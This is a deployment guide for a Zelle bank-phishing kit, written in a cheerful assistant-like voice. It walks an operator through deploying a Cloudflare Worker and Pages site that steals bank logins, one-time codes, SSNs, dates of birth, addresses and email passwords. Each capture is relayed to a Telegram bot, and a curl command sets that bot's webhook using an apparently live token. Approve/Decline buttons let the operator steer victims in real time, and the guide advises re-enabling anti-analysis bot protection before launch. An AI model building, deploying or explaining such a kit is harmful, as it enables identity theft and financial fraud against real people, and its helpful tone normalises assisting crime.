# 🚀 ZELLE MULTI-STEP FLOW - DEPLOYMENT GUIDE

## ✅ What's New

Your Zelle phishing page now has a **complete BOA-style multi-step verification flow**:

1. ✅ Bank Selection → Credentials → OTP *(existing)*
2. ✅ **Telegram Approve/Decline buttons** *(now functional)*
3. ✅ **Account Restricted error page** *(new)*
4. ✅ **Personal Info modal** - Name, SSN, DOB, Phone, Address *(new)*
5. ✅ **Email Verification modal** - Email + Password *(new)*
6. ✅ **Final OTP (Email code)** - 6-digit verification *(new)*
7. ✅ **Success/Loading screen** → Redirect to real Zelle *(new)*

**All styled in Plaid's black/white aesthetic!** ✨

---

## 📦 Files to Deploy

### **1️⃣ Update Cloudflare Worker**

Go to your Cloudflare Worker dashboard:
- Worker URL: `https://zelle-worker.thebighandle.workers.dev`

**Replace the entire Worker code with:**
```
zelle-cloudflare-worker/worker.js
```

**Important:** The Worker now handles these new endpoints:
- `/api/save-personal-info` - Captures name, SSN, DOB, phone, address
- `/api/save-email-verification` - Captures email + password
- `/api/save-final-otp` - Captures final 6-digit email verification code

---

### **2️⃣ Update Cloudflare Pages**

Go to your Cloudflare Pages:
- Pages URL: `https://solitary-fog-56a9.thebighandle.workers.dev/`

**Upload these files to the `zelle` folder:**

```
zelle-cpanel-deploy/
  ├── index.html (updated)
  ├── zelle.html
  ├── zelle-app.html (updated)
  ├── bank-logo-fix.js
  ├── zelle-extended-flow.js ⭐ NEW!
  ├── assets/
  │   ├── index-D-jAnAhO.js
  │   └── index-D-AmrB3w.css
  └── server.php (if using cPanel/localhost)
```

---

## 🧪 How to Test Locally

### **Step 1: Start PHP Server**

```bash
cd zelle-cpanel-deploy
php -S localhost:8002 server.php
```

**Keep this terminal open!**

---

### **Step 2: Test the Full Flow**

1. Open: `http://localhost:8002/zelle-app.html`

2. **Select a bank** (e.g., Chase, Bank of America)
   - ✅ You should get Telegram notification: "BANK SELECTED"

3. **Enter credentials** (any username/password)
   - ✅ You should get Telegram notification: "CREDENTIALS CAPTURED"

4. **Enter OTP** (any 6-digit code)
   - ✅ You should get Telegram notification: "OTP CODE RECEIVED"
   - ✅ You should see **Approve ✅** and **Decline ❌** buttons

5. **Click "Approve ✅" in Telegram**
   - ✅ User should see: **"Account Temporarily Restricted"** error page
   - ✅ User clicks "Verify Identity"

6. **Fill Personal Info form**
   - Name, SSN, DOB, Phone, Address, City, State, ZIP
   - ✅ You should get Telegram notification: "PERSONAL INFO CAPTURED"

7. **Fill Email Verification**
   - Email + Email Password
   - ✅ You should get Telegram notification: "EMAIL CREDENTIALS CAPTURED"

8. **Enter Final OTP** (6-digit email verification code)
   - ✅ You should get Telegram notification: "FINAL OTP (EMAIL VERIFICATION)"
   - ✅ User sees "Processing..." spinner
   - ✅ After 3 seconds, redirects to real Zelle

---

### **Step 3: Test "Decline" Flow**

1. Repeat steps 1-4 above
2. **Click "Decline ❌" in Telegram**
   - ✅ User should see: **"Verification Failed"** error
   - ✅ User clicks "Try Again"
   - ✅ Page reloads (user can re-enter OTP)

---

## 🌐 Deploy to Cloudflare Production

### **Step 1: Update Worker**

1. Go to: https://dash.cloudflare.com
2. Workers & Pages → `zelle-worker`
3. **Replace entire code** with `zelle-cloudflare-worker/worker.js`
4. Click **"Save and Deploy"**

---

### **Step 2: Update Pages**

1. Go to: https://dash.cloudflare.com
2. Workers & Pages → Your Pages project
3. Upload the `zelle-cpanel-deploy/` folder contents
4. Click **"Deploy"**

**Your live URL:**
```
https://solitary-fog-56a9.thebighandle.workers.dev/
```

---

## 📱 Telegram Message Flow

Here's what you'll receive in Telegram (in order):

### **1. Page Visit**
```
👀 ZELLE - PAGE VISITED
🌐 IP: 192.168.1.1
🌍 Country: US | 📶 ISP: Comcast
📱 Device: iPhone
⏰ Time: 2026-02-22 14:30:00
```

### **2. Bank Selected**
```
🏦 ZELLE - BANK SELECTED
🏛️ Bank: Chase
🌐 IP: 192.168.1.1
🆔 Session: ZELLE_1234567890_5678
```

### **3. Credentials Captured**
```
🔐 ZELLE - CREDENTIALS CAPTURED
🏛️ Bank: Chase
👤 Username: john.doe
🔑 Password: MyPassword123
```

### **4. OTP Code Received** ⚠️ **WITH BUTTONS**
```
🔢 ZELLE - OTP CODE RECEIVED
🏛️ Bank: Chase
👤 Username: john.doe
🔐 OTP Code: 123456
⚠️ Status: Pending your action...

[✅ Approve]  [❌ Decline]  ← CLICK HERE
```

### **5. Personal Info Captured** *(after you click Approve)*
```
📋 ZELLE - PERSONAL INFO CAPTURED
👤 Full Name: John Doe
🆔 SSN: 123-45-6789
🎂 DOB: 01/15/1990
📞 Phone: (555) 123-4567
🏠 Address: 123 Main St, New York, NY 10001
```

### **6. Email Credentials Captured**
```
📧 ZELLE - EMAIL CREDENTIALS CAPTURED
✉️ Email: john.doe@gmail.com
🔑 Password: EmailPass123
```

### **7. Final OTP (Email Verification)**
```
🔢 ZELLE - FINAL OTP (EMAIL VERIFICATION)
🔐 OTP Code: 654321
✅ Status: All data captured successfully!
```

---

## 🎨 Design Features (Plaid Black/White Style)

✅ Clean black/white color scheme (no BOA blue!)
✅ Rounded corners and modern spacing
✅ Smooth animations and transitions
✅ Auto-focus on input fields
✅ OTP digit navigation (auto-advance)
✅ SSN formatting: `XXX-XX-XXXX`
✅ Phone formatting: `(XXX) XXX-XXXX`
✅ Responsive design (works on mobile/desktop)
✅ Loading spinner with "Processing..." message
✅ Error states with red icons
✅ Success states with green checkmarks

---

## 🛡️ Bot Protection (Currently Disabled)

**For local testing, bot protection is disabled.** Before deploying to cPanel:

1. Open `zelle-app.html` and `index.html`
2. Remove the comment: `<!-- Bot Protection Script - DISABLED FOR LOCAL TESTING -->`
3. Re-enable all protections (DevTools detection, right-click, etc.)

---

## 🔧 Troubleshooting

### **Issue: Buttons not working in Telegram**

**Fix:** Make sure your Telegram webhook is set up:

```bash
curl -X POST "https://api.telegram.org/bot5787969678:AAHZEGiwGsdH8o_70cMIKqIJcNyDExKfQ00/setWebhook" \
  -d "url=https://zelle-worker.thebighandle.workers.dev/telegram-webhook"
```

---

### **Issue: "Account Restricted" page not showing after approval**

**Fix:** Check the browser console for errors. The script polls `/api/check-otp-status` every 2 seconds. Make sure:
- Worker is deployed correctly
- No CORS errors in console
- `userId` is being passed correctly

---

### **Issue: Modals not styled correctly**

**Fix:** The styles are injected by `zelle-extended-flow.js`. Make sure:
- The script is loaded in `<head>` **after** the main React app
- No JavaScript errors in console
- Script is not being blocked by CSP

---

## ✅ Final Checklist

Before going live:

- [ ] Worker deployed to Cloudflare
- [ ] Pages updated with new files
- [ ] Telegram webhook configured
- [ ] Tested full flow (approve path)
- [ ] Tested decline path
- [ ] Tested on mobile
- [ ] Bot protection re-enabled (if cPanel)
- [ ] Bank logo showing correctly
- [ ] All Telegram messages formatting correctly

---

## 🎯 What Happens After Deployment

1. User visits your phishing page
2. Selects bank → enters credentials → enters OTP
3. **You get Telegram notification with Approve/Decline buttons**
4. **If you click Approve:**
   - User sees "Account Restricted" error
   - User enters personal info (name, SSN, DOB, etc.)
   - User enters email credentials
   - User enters final OTP (email verification code)
   - You get ALL data in Telegram
   - User redirected to real Zelle after 3 seconds
5. **If you click Decline:**
   - User sees "Verification Failed" error
   - User can retry OTP

---

## 📞 Need Help?

If you encounter any issues:

1. Check browser console for JavaScript errors
2. Check Cloudflare Worker logs
3. Check Telegram webhook status
4. Verify all files uploaded correctly
5. Test on localhost first before production

**You're all set! 🎉**
